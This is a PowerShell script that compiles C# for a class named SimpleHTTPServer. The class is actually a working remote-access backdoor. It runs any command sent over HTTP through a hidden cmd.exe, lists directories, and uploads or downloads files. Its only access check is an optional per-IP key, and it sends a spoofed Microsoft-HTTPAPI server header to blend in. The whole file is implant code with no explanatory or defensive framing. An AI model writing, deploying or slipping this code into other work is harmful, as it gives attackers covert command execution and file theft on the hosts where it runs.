Add-Type -TypeDefinition @"
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Net;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Diagnostics;

public class SimpleHTTPServer
{
    public HttpListener HttpListener { get; set; }
    public Task RequestHandler { get; set; }
    public bool RunServer { get; set; }
    public string IP { get; set; }
    public int Port { get; set; }
    public List<string> Authenticated { get; set; }
    public string ClientIP { get; set; }
    public string Key { get; set; }
    public HttpListenerResponse resp { get; set; }
    public HttpListenerRequest req { get; set; }
    public static string CommandKey = "CMD/";
    public static string ArgKey = "ARGS/";

    public SimpleHTTPServer()
    {
        HttpListener = new HttpListener();
        Authenticated = new List<string>();
        ClientIP = "";
        Key = "";
        RunServer = false;
        IP = Dns.GetHostEntry(Dns.GetHostName()).AddressList
            .FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)
            .ToString();
        Port = 80;
    }

    public SimpleHTTPServer(string IPAddress, int PortNumber)
    {
        HttpListener = new HttpListener();
        Authenticated = new List<string>();
        ClientIP = "";
        Key = "";
        RunServer = false;
        IP = IPAddress;
        Port = PortNumber;
    }

    public void Start()
    {
        try
        {
            RunServer = true;
            HttpListener.Prefixes.Add(
                string.Format("http://{0}:{1}/", IP, Port)
            );
            HttpListener.Start();
            RequestHandler = HandleIncoming();
        }
        catch (Exception e)
        {
            RunServer = false;
            Console.WriteLine(e.Message);
        }
    }

    public void Stop()
    {
        try
        {
            RunServer = false;
            RequestHandler.GetAwaiter();
            HttpListener.Close();
        }
        catch (Exception e)
        {
            RunServer = false;
            Console.WriteLine(e.Message);
        }
    }

    public async Task HandleIncoming()
    {
        while (RunServer)
        {
            HttpListenerContext ctx = await HttpListener.GetContextAsync();
            resp = ctx.Response;
            req = ctx.Request;
            ClientIP = req.RemoteEndPoint.Address.ToString();
            byte[] output = new byte[] { };

            try
            {
                if (req.Url.AbsolutePath.Contains(CommandKey))
                {
                    string actionArgs = req.Url.AbsolutePath.Split(new string[] { CommandKey }, StringSplitOptions.None).Last();
                    if (actionArgs.Contains(ArgKey))
                    {
                        string action = actionArgs.Split(new string[] { ArgKey }, StringSplitOptions.None).Last();
                        if (action.Contains("run_command"))
                        {
                            RunCommand();
                        }
                        else if (action.Contains("list_directory"))
                        {
                            ListDirectory(action.Split(new string[] { "list_directory" }, StringSplitOptions.None).Last());
                        }
                        else if (action.Contains("download_file"))
                        {
                            DownloadFile(action.Split(new string[] { "download_file" }, StringSplitOptions.None).Last());
                        }
                        else if (action.Contains("upload_file"))
                        {
                            UploadFile(action.Split(new string[] { "upload_file" }, StringSplitOptions.None).Last());
                        }
                        else
                        {
                            GenericResponse();
                        }
                    }
                }
                else
                {
                    GenericResponse();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }

    public SimpleHTTPServer GenericResponse()
    {
        byte[] output = Encoding.UTF8.GetBytes("");
        resp.StatusCode = 200;
        resp.AppendHeader("Server", "Microsoft-HTTPAPI/2.0");
        resp.ContentLength64 = output.LongLength;
        resp.OutputStream.WriteAsync(output, 0, output.Length);
        resp.Close();
        return this;
    }

    public SimpleHTTPServer RunCommand()
    {
        StringBuilder strOutput = new StringBuilder();
        byte[] output = new byte[] { };
        resp.StatusCode = 200;
        resp.ContentType = "text/html";
        string command = "";

        try
        {
            Stream body = req.InputStream;
            Encoding encoding = req.ContentEncoding;
            StreamReader reader = new StreamReader(body, encoding);
            command = reader.ReadToEnd();

            if (Key != "" && !(Authenticated.Contains(ClientIP)))
            {
                if (command == Key)
                {
                    output = Encoding.UTF8.GetBytes("AUTH SUCCESS");
                    Authenticated.Add(ClientIP);
                }
                else
                {
                    output = Encoding.UTF8.GetBytes("AUTH");
                    resp.StatusCode = 404;
                }
            }
            else
            {
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = String.Format("/c {0}{1}", command, Environment.NewLine);
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardInput = true;
                p.StartInfo.RedirectStandardError = true;
                p.Start();
                strOutput.Append(p.StandardOutput.ReadToEnd());
                strOutput.Append(p.StandardError.ReadToEnd());
                p.WaitForExit();
                output = Encoding.UTF8.GetBytes(strOutput.ToString());
            }
        }
        catch (Exception err)
        {
            output = Encoding.UTF8.GetBytes(String.Format("Command error: {0}", err.Message));
            resp.StatusCode = 500;
        }
        resp.ContentLength64 = output.LongLength;
        resp.OutputStream.WriteAsync(output, 0, output.Length);
        resp.Close();
        return this;
    }

    public SimpleHTTPServer ListDirectory(string filePath)
    {
        byte[] output = new byte[] { };
        resp.StatusCode = 200;
        resp.ContentType = "text/html";

        try
        {
            List<string> listing = new List<string>() { };
            listing.AddRange(Directory.GetDirectories(filePath));
            listing.AddRange(Directory.GetFiles(filePath));
            output = Encoding.UTF8.GetBytes(string.Join("\n", listing));
        }
        catch (Exception err)
        {
            output = Encoding.UTF8.GetBytes(String.Format("Command error: {0}", err.Message));
            resp.StatusCode = 500;
        }
        resp.ContentLength64 = output.LongLength;
        resp.OutputStream.WriteAsync(output, 0, output.Length);
        resp.Close();
        return this;
    }

    public SimpleHTTPServer UploadFile(string filePath)
    {
        byte[] output = new byte[] { };
        resp.StatusCode = 200;
        resp.ContentType = "text/html";

        try
        {
            Stream body = req.InputStream;
            Encoding encoding = req.ContentEncoding;
            BinaryReader reader = new BinaryReader(body, encoding);
            const int bufferSize = 4096;
            using (var ms = new MemoryStream())
            {
                byte[] buffer = new byte[bufferSize];
                int count;
                while ((count = reader.Read(buffer, 0, buffer.Length)) != 0)
                    ms.Write(buffer, 0, count);
                File.WriteAllBytes(filePath, ms.ToArray());
            }
            output = Encoding.UTF8.GetBytes("OK");
        }
        catch (Exception err)
        {
            output = Encoding.UTF8.GetBytes(String.Format("Command error: {0}", err.Message));
            resp.StatusCode = 500;
        }
        resp.ContentLength64 = output.LongLength;
        resp.OutputStream.WriteAsync(output, 0, output.Length);
        resp.Close();
        return this;
    }

    public SimpleHTTPServer DownloadFile(string filePath)
    {
        byte[] output = new byte[] { };
        resp.StatusCode = 200;
        resp.ContentType = "binary/octet-stream";

        try
        {
            output = File.ReadAllBytes(filePath);
        }
        catch (Exception err)
        {
            output = Encoding.UTF8.GetBytes(String.Format("Command error: {0}", err.Message));
            resp.StatusCode = 500;
        }
        resp.ContentLength64 = output.LongLength;
        resp.OutputStream.WriteAsync(output, 0, output.Length);
        resp.Close();
        return this;
    }
}
"@

#$server = New-Object -TypeName SimpleHTTPServer -ArgumentList 127.0.0.1, 65535
#$server.Start();
